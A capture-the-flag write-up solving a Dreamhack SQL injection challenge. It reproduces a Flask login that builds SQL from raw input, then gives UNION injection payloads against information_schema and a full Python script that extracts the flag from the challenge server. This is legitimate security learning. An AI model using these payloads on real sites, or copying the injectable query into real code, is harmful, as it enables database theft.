---
title: baby-union
author: thanguyen165
date: 2023-01-01 07:00:00 +0700
categories: [Practice, dreamhack]
tags: [Web Exploitation, dreamhack]
---

* Level: 1
* Link: [https://dreamhack.io/wargame/challenges/984](https://dreamhack.io/wargame/challenges/984)

## Description

> This is a web service that prints out the information of your account when you log in.
> 
> Obtain a flag through ```SQL INJECTION VULNERABILITIES```. The table and column names in the ```init.sql``` file given in the problem are different from the actual names.
> 
> The flag format is ```DH{...}```.

### Attached

```sql
CREATE DATABASE secret_db;
GRANT ALL PRIVILEGES ON secret_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `secret_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null,
  descr varchar(128) not null
);

INSERT INTO users (uid, upw, descr) values ('admin', 'apple', 'For admin');
INSERT INTO users (uid, upw, descr) values ('guest', 'melon', 'For guest');
INSERT INTO users (uid, upw, descr) values ('banana', 'test', 'For banana');
FLUSH PRIVILEGES;

CREATE TABLE fake_table_name (
  idx int auto_increment primary key,
  fake_col1 varchar(128) not null,
  fake_col2 varchar(128) not null,
  fake_col3 varchar(128) not null,
  fake_col4 varchar(128) not null
);

INSERT INTO fake_table_name (fake_col1, fake_col2, fake_col3, fake_col4) values ('flag is ', 'DH{sam','ple','flag}');
```
{: file="init.sql" }

```py
import os
from flask import Flask, request, render_template
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'secret_db')
mysql = MySQL(app)

@app.route("/", methods = ["GET", "POST"])
def index():

    if request.method == "POST":
        uid = request.form.get('uid', '')
        upw = request.form.get('upw', '')
        if uid and upw:
            cur = mysql.connection.cursor()
            cur.execute(f"SELECT * FROM users WHERE uid='{uid}' and upw='{upw}';")
            data = cur.fetchall()
            if data:
                return render_template("user.html", data=data)

            else: return render_template("index.html", data="Wrong!")

        return render_template("index.html", data="Fill the input box", pre=1)
    return render_template("index.html")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
{: file="app.py" }

## Analyzation

Firstly, we need to have the table containing flag:

```py
login_info = {
    "uid": "any-string",
    "upw": "' UNION SELECT table_name, table_type, version, table_rows FROM information_schema.tables WHERE '1'='1"
}
```

Then the sql query will be

```sql
SELECT * FROM users WHERE uid='any-string' and upw='' UNION SELECT table_name, table_type, version, table_rows FROM information_schema.tables WHERE '1'='1';
```

The ```information_schema.tables``` table provides information about tables in databases. See more at [dev.mysql.com](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html).

Now we have table name, ```onlyflag```.

We need the columns' name, too. [```information_schema.columns```](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) will work

```py
login_info = {
    "uid": "any-string",
    "upw": "' UNION SELECT column_name, data_type, character_maximum_length, column_type FROM information_schema.columns WHERE table_name='onlyflag"
}
```

Now we have the columns, ```["idx", "sname", "svalue", "sflag", "sclose"]```.

## Solution

```py
import requests

URL = "http://host3.dreamhack.games:19276/"

def post(payload):
    response = requests.post(URL, data=payload)
    if response.status_code != 200:
        print(f"Failed to post {URL}: {response.status_code}")
        exit()
    return response.text

def exact(text: str):
    list = text.split('<th scope="row">')
    list = list[1:] # remove first element, not relevant information
    list = [item.split('</th>')[0] for item in list] # remove </th> tag
    return list

def print_response(response):
    for item in response:
        print(item)

login_infor = {
    "uid": "admin",
    "upw": "admin"
}

def get_flag_table_name():
    payload = "' UNION SELECT table_name, table_type, version, table_rows FROM information_schema.tables WHERE '1'='1"
    login_infor["upw"] = payload

    return exact(post(login_infor))

def get_flag_column_name(table_name: str):
    payload = f"' UNION SELECT column_name, data_type, character_maximum_length, column_type FROM information_schema.columns WHERE table_name='{table_name}"
    login_infor["upw"] = payload

    return exact(post(login_infor))

def get_flag(columns_name):
    payload = ""
    for i in range(3):
        payload += f"' UNION SELECT {columns_name[(i+2)%5]}, {columns_name[(i+3)%5]}, {columns_name[(i+4)%5]}, {columns_name[(i+1)%5]} FROM onlyflag WHERE '1'='1"
    login_infor["upw"] = payload
    return exact(post(login_infor))

if __name__ == "__main__":
    response = get_flag_table_name()
    # print_response(response)
    flag_table = response[-1]

    columns_name = get_flag_column_name(flag_table)
    # print_response(columns_name)

    flag = get_flag(columns_name)
    print(flag[0] + flag[1] + flag[2])
```

The flag is
```
DH{57033624d7f142f57f139b4c9e84bd78da77b4406896c386672f0cbb016f5873}
```